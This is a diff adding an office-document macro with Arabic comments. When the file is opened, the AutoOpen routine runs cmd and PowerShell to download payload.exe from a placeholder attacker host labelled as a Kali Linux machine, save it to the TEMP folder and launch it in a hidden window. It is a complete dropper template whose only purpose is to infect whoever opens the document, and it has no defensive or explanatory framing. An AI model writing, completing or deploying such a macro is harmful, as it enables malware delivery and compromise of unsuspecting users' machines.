@@ -1,0 +1,31 @@
+Sub AutoOpen()
+    Dim sExe As String
+    Dim sArgs As String
+    Dim sPayloadURL As String
+    Dim sTempPath As String
+    Dim sPayloadFileName As String
+
+    sExe = "C:\Windows\System32\cmd.exe"
+
+    sPayloadURL = "http://[Your Kali Linux IP]:8080/payload.exe" ' تأكد من أن هذا هو IP خادم Kali HTTP الصحيح
+    sTempPath = Environ("TEMP") & "\"
+    sPayloadFileName = "temp_payload.exe"
+
+    ' التعديل هنا:
+    ' استخدام "start /wait powershell.exe ..." لفتح PowerShell في نافذة جديدة
+    ' ثم استخدام "cmd /k" لجعل نافذة cmd الأصلية تبقى مفتوحة بعد ذلك
+    ' **C:\Users\Public\powershell_output.txt** هو المسار الذي سيسجل فيه الخطأ أو المخرجات.
+    sArgs = "/k powershell -NoProfile -Command ""Invoke-WebRequest -Uri '" & sPayloadURL & "' -OutFile '" & sTempPath & sPayloadFileName & "';" & _
+            "Start-Process -FilePath '" & sTempPath & sPayloadFileName & "' -WindowStyle Hidden;" & _
+            "Write-Host 'Payload execution attempted. Check logs.' ; Read-Host 'Press Enter to close this window'"" > ""C:\Users\Public\powershell_output.txt"" 2>&1"
+
+    Dim oShell As Object
+    oShell = createUnoService("com.sun.star.system.SystemShellExecute")
+
+    On Error GoTo ErrorHandler
+    oShell.execute(sExe, sArgs, "", 0, False) ' False لعدم انتظار الماكرو، لكن cmd ستظل مفتوحة
+    Exit Sub
+
+ErrorHandler:
+    MsgBox "An error occurred while trying to execute the command. Error: " & Err.Description, 16, "Macro Error"
+End Sub
